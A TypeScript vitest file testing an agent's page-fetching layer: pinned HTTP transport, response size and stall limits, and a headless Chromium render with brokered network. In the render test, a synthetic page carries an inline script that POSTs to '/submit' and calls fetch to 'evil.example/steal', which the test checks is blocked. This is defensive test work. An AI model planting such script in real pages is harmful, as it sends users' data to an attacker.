import { it, expect } from 'vitest';
import { createServer, type Server } from 'node:http';
import { gzipSync } from 'node:zlib';
import { pinnedRequest } from '../../apps/agent/src/fetch/network.js';
import { SourceClient } from '../../apps/agent/src/fetch/client.js';
import { renderPage } from '../../apps/agent/src/fetch/render.js';
import { syntheticSource, instantLimiter, testNow } from '../helpers/source.js';
async function listen(server: Server) {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('No address');
  return address.port;
}
async function close(server: Server) {
  server.closeAllConnections();
  await new Promise<void>((resolve) => server.close(() => resolve()));
}
it('R03 internal pinned transport preserves Host and bounds compressed responses', async () => {
  let receivedHost = '';
  const server = createServer((req, res) => {
    receivedHost = req.headers.host ?? '';
    res.writeHead(200, { 'content-type': 'text/plain', 'content-encoding': 'gzip' });
    res.end(gzipSync('synthetic transport'));
  });
  const port = await listen(server);
  try {
    const response = await pinnedRequest({
      url: new URL(`http://synthetic.example:${port}`),
      addresses: [{ address: '127.0.0.1', family: 4 }],
      headers: {},
      timeoutMs: 2000,
      maxBytes: 1024,
    });
    expect(response.body.toString()).toBe('synthetic transport');
    expect(receivedHost).toBe(`synthetic.example:${port}`);
  } finally {
    await close(server);
  }
});
it('R03 transport aborts oversized and stalled responses', async () => {
  const server = createServer((req, res) => {
    if (req.url === '/large') {
      res.writeHead(200);
      res.end('x'.repeat(2048));
    } else {
      res.writeHead(200);
      res.flushHeaders();
    }
  });
  const port = await listen(server);
  try {
    for (const route of ['/large', '/stall'])
      await expect(
        pinnedRequest({
          url: new URL(`http://synthetic.example:${port}${route}`),
          addresses: [{ address: '127.0.0.1', family: 4 }],
          headers: {},
          timeoutMs: 200,
          maxBytes: 128,
        }),
      ).rejects.toThrow();
  } finally {
    await close(server);
  }
});
it('R03 real Chromium executes synthetic JS while all network is brokered and POST blocked', async () => {
  const source = syntheticSource();
  const requests: string[] = [];
  const client = new SourceClient({
    load: async () => source.bundle,
    keys: source.trust,
    userAgent: 'UttirnoNoticeBot/0.2 (+https://example.com)',
    now: () => testNow,
    limiter: instantLimiter(),
    resolver: async () => [{ address: '8.8.8.8', family: 4 }],
    transport: async (request) => {
      requests.push(request.url.pathname);
      const body =
        request.url.pathname === '/robots.txt'
          ? 'User-agent: *\nAllow: /'
          : `<!doctype html><body><script>fetch('/submit',{method:'POST'}).catch(()=>{}); fetch('https://evil.example/steal').catch(()=>{});const h=document.createElement('h1');h.id='ready';h.textContent='Synthetic rendered title';document.body.append(h);</script></body>`;
      return {
        status: 200,
        headers: {
          'content-type': request.url.pathname === '/robots.txt' ? 'text/plain' : 'text/html',
        },
        body: Buffer.from(body),
      };
    },
  });
  const rendered = await renderPage(client, 'https://notices.example/list', '#ready');
  expect(rendered.html).toContain('Synthetic rendered title');
  expect(rendered.blockedRequests).toBeGreaterThan(0);
  expect(requests).not.toContain('/submit');
  expect(requests).not.toContain('/steal');
}, 20000);
